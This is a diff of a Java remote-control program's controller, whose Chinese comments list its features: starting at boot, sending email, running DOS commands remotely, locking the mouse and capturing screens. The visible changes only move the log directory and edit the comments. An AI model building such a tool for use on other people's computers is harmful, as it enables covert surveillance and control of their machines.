@@ -12,7 +12,7 @@ import java.util.Scanner;
 /*
  * 本程序功能
  * 1、程序开机自动启动，并自动发送邮件
- * 2、自动复制(只在本地),可以方便嵌入到其它java程序当中
+ * 2、屏幕控制，可以观看被控制端屏幕，控制鼠标，控制键盘
  * 3、执行dos命令，并将信息返回、这里可以执行关机等命令
  * 4、锁定鼠标，这里通过一个线程实现
  * 5、查看被控制端的桌面，将桌面画面截图并发送给控制端
@@ -32,24 +32,26 @@ public class Main {
     int PORT = 1220;
     final int PORT_FOR_SCREEN=1222;
     String IP = "127.0.0.1";
-    String path = "D:\\pic";
+    String path = "C:\\pic";
     File file;
     BufferedWriter bw;
     String fileName;
-
+/*
+* 控制端，输出内容在C盘pic目录下
+* */
     public Main() {
         in = new Scanner(System.in);
         System.out.print("输入IP：");
         IP = in.nextLine().trim();
         try {
             socket = new Socket(IP, PORT);
-            //创建文件夹，用来存储返回的信息，存在D:\\pic\\+日期的目录下
+            //创建文件夹，用来存储返回的信息，存在C:\\pic\\+日期的目录下
             Date date = new Date();
             SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分");
             fileName = sdf.format(date);
-            file = new File("D:\\pic\\" + fileName);
+            file = new File(path+"\\" + fileName);
             file.mkdirs();
-            file = new File("D:\\pic\\" + fileName + "\\log.txt");
+            file = new File(path+"\\" + fileName + "\\log.txt");
             try {
                 bw = new BufferedWriter(new OutputStreamWriter(
                         new FileOutputStream(file)));
@@ -57,7 +59,7 @@ public class Main {
                 e.printStackTrace();
             }
             try {
-                // 所有的记录都会存在D:\\pic这个目录下~
+                // 所有的记录都会存在C:\\pic这个目录下~
                 bw.write("开始记录");
                 bw.newLine();
                 bw.flush();
